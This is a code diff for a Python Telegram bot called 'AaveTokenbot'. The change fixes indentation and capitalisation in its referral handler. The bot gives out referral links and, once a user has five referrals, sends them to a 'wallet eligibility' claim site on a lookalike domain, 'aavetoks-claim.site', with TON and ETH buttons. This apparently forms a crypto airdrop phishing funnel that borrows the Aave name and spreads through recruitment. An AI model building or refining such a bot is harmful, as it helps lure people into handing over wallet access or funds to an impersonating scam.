@@ -2,7 +2,6 @@ from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFi
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
 from db_handler import init_db, add_or_update_user, update_referrals, get_user_data, get_user_id_by_username
 
-
 # Function to handle button click
 async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -12,21 +11,21 @@ async def button_click_handler(update: Update, context: ContextTypes.DEFAULT_TYP
     # Get updated referral count
     referrals = get_user_data(user_id)
 
-   # Check if the user has 5 or more referrals
-if query.data == 'generate_referral':
-    # Handle the case when the user does not have a username
-    if username is None:
-        username = str(user_id)
-    
-    # Generate and send referral link
-    referral_link = f"https://t.me/AaveTokenbot?start=referral_{username}"
-    await query.answer()
-    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your referral link is: {referral_link}")
+    # Check if the user has 5 or more referrals
+    if query.data == 'generate_referral':
+        # Handle the case when the user does not have a username
+        if username is None:
+            username = str(user_id)
+
+        # Generate and send referral link
+        referral_link = f"https://t.me/AaveTokenbot?start=referral_{username}"
+        await query.answer()
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your referral link is: {referral_link}")
 
     elif referrals >= 5:
         # Redirect to your website if the user has enough referrals
         await query.answer()
-        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Congratulations! You have {referrals} referrals. you can now check wallet eligibility:",
+        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Congratulations! You have {referrals} referrals. You can now check wallet eligibility:",
                                       reply_markup=InlineKeyboardMarkup([
                                           [InlineKeyboardButton("TON", url='https://aavetoks-claim.site'),
                                            InlineKeyboardButton("ETH", url='https://aavetoks-claim.site'),
